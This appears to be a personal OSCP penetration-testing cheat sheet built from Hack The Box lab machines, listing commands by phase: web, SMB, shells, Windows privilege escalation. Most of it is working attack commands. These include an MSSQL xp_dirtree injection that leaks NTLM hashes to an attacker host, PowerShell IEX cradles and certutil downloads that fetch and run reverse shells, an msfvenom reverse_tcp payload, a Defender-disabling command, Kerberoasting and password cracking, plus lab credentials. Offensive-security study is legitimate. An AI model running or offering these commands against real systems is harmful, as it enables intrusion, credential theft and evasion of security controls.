# oscpNotes

WEB
davtest
droopescan --> https://github.com/droope/droopescan
http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
https://www.gracefulsecurity.com/sql-injection-cheat-sheet-mssql/
# make smb request to steal hash +++ listen with responder -I tun0
27;declare @q varchar(200);set @q='\\10.10.14.7\foo'; exec master.dbo.xp_dirtree @q; --
john stacy.hash --wordlist=/usr/share/wordlists/rockyou.txt
hydra internal-01.bart.htb http-form-post "/simple_chat/login.php:uname=^USER^&passwd=^PASS^&submit=Login:Password" -l harvey -P /usr/share/wordlists/metasploit/common_roots.txt


ENUMERATION
gobuster dir -u http://10.10.10.98 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
if ports appear wrapped with nmap add -n option

DNS
dnsrecon -d 10.10.10.100 -r 10.0.0.0/8

WINDOWS

#enumerate folders  in powershell
gci -recurse . | select fullname
# Disable defender real time scan
Set-MpPreference -DisableRealtimeMonitoring $true

LFI
https://www.gracefulsecurity.com/path-traversal-cheat-sheet-windows/


SMB
#anonymous share access
smbmap -u anonymous -H ip
# recursive all with depth
smbmap -u anonymous -H 10.10.10.130 -r --depth 5
smbmap -u USER -p PASSWORD -d DOMAIN -H ip
# recursively list share contents
smbmap -R dirname -H ip
# download file with certain name
smbmap -R dirname -H ip -A Groups.xml
# list shares with creds
smbmap -d active.htb -u svc_tgs -p GPPstillStandingStrong2k18 -H 10.10.10.100
# decrypt gpp password, cpassword comes from group xml
gpp-decrypt "cpassword"
# Get AD users after having user creds
GetADUsers.py -all -dc-ip 10.10.10.100 active.htb/svc_tgs  # unicode errors see https://github.com/SecureAuthCorp/impacket/issues/632
# Get user spn # https://docs.microsoft.com/en-us/windows/win32/ad/service-principal-names !!! FIX TIME SKEW
GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/svc_tgs
smbclient -L //10.10.10.100   (enter if password is requested)
smbclient -U anonymous  //10.10.10.130/batshare


SHELLS
cp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 .
psexec.py  'user:pass@localhost' cmd

ENUMERATION

JAWS --> https://github.com/411Hall/JAWS.git

DOWNLOAD SHELL POWERSHELL

cmd /c powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.12/rev1.ps1')  (may need to escape quotes)
AVOID BAD CHARACTERS --> convert to windows file format
iconv -t UTF-16LE | base64-w0 
powershell 64 bit is stored in C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe
start-process -Filepath "powershell" -argumentlist "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.73/adm.txt')" -credential $cred

DOWNLOAD FILE CMD/PS
certutil -urlcache -split -f http://10.10.14.12/priv.exe C:\\users\\public\\agent.exe #CMD
(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.12/priv.exe', 'C:/inetpub/wwwroot/1.exe') # PS
Start-BitsTransfer -Source http://10.10.14.12/priv.exe -Destination 1.exe # PS
$client = New-Object System.Net.WebClient  # two steps is better
$client.DownloadFile('http://10.10.14.12/priv.exe', '1.exe')
xcopy \\10.10.14.7\files\taskkill.exe  # from smb file server created with impacket

PRIVESC WINDOWS 
whoami /priv
# if SeImpersonatePrivilege is enabled --> juicy/rotten potato
systeminfo
metasploit local_exploit_suggester --> find vulns
sherlock --> find vulns
MS16-032 --> empire --> https://github.com/EmpireProject/Empire.git --> empire/data/module_source/privesc/Invoke-MS16032.ps1 !!! BE SURE TO RUN IN X64
powerup --> empire echo IEX(New-Object Net.WebClient).downloadString('http://10.10.14.12/PowerUp.ps1') | powershell -noprofile -
  Either append Invoke-Allchecks at the bottom or after execution type Invoke-AllChecks
  or cat powerup.ps1 | grep functions
    Get-RegistryAutoLogon
MS15-051 --> https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051
[environment]::is64bitoperatingsystem
[environment]::is64bitprocess
#If problems occure with privesc check proccess architecture and run powershell 64bit
cmd%20/c%20c:\Windows\SysNative\WindowsPowershell\v1.0\powershell%20IEX(New-Object%20Net.WebClient).downloadString(%27http://10.10.14.73/rev.txt%27)


#create credentials object
$pass = ConvertTo-SecureString 'Welcome1!' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('Administrator',$pass)
start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.73/rev1.txt')" -credential $cred
Invoke-Command -Credential $cred -ScriptBlock {"whoami"}

#powershell suite runas 
  paste following at the bottom of the script(see bart video @ 55:36):
  Invoke-runAs -User administrator -Password 3130438f31186fbaf962f407711faddb -LogonType 0x1 -Binary c:\windows\sysnative\windowspowershell\v1.0\powershell.exe -Args "IEX(new-Object Net.webclient).downloadString('http://10.10.14.73/rev1.txt')"


LINUX





USEFULL COMMANDS.ps1
tcpdump -i tun0 icmp
python -m SimpleHTTPServer 80
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.7 LPORT=51251 -f exe -o taskkil.exe
impacket-smbserver files `pwd`


USEFULL FRAMEWORKS
GIT
nishang --> https://github.com/samratashok/nishang.git
JAWS  --> enumeration https://github.com/411Hall/JAWS.git
impacket --> https://github.com/SecureAuthCorp/impacket.git
webshells --> https://github.com/BlackArch/webshells.git
sherlock --> https://github.com/rasta-mouse/Sherlock
empire --> https://github.com/EmpireProject/Empire.git
unicorn --> https://github.com/trustedsec/unicorn.git
powersploit --> https://github.com/PowerShellMafia/PowerSploit.git
powershell-suite --> https://github.com/FuzzySecurity/PowerShell-Suite
APT
gobuster
mdbtools
seclists
shellter + dpkg --add-architecture i386 && apt-get update && apt-get install wine32

VARIOUS
#Decrypt LUKS
https://www.youtube.com/watch?v=krC5j1Ab44I
